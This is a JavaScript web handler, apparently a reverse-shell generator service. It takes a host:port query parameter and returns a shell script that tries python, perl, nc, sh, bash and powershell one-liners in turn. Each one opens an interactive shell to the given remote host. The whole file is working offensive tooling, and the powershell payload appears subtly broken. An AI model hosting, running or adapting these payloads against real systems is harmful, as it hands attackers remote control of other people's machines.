'use strict';

const usage = `
i was here
`;

const reverseShell = (address = '') => {
	const [host, port] = address.split(':');
	if (!host || !port) {
		return usage;
	}

	const payloads = {
		python: `python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("${host}",${port})); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'`,
		perl: `perl -e 'use Socket;$i="${host}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
		nc: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${host} ${port} >/tmp/f`,
		sh: `/bin/sh -i >& /dev/tcp/${host}/${port} 0>&1`,
		bash: `/bin/bash -i >& /dev/tcp/${host}/${port} 0>&1`,
		powershell:`powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("${host}",${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> " ;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};
		`
	};

	return Object.entries(payloads).reduce((script, [cmd, payload]) => {
		script += `

if command -v ${cmd} > /dev/null 2>&1; then
	${payload}
	exit;
fi`;

		return script;
	}, usage);
};

const handler = (request, response) => {
	const { address } = request.query;

	const one_month = 60 * 60 * 24 * 30;

	response.setHeader('Content-Type', 'text/plain');
	response.setHeader('Cache-Control', `s-maxage=${one_month}`); // Cache at edge
	response.send(reverseShell(address));
};

module.exports = handler;

module.exports.reverseShell = reverseShell;
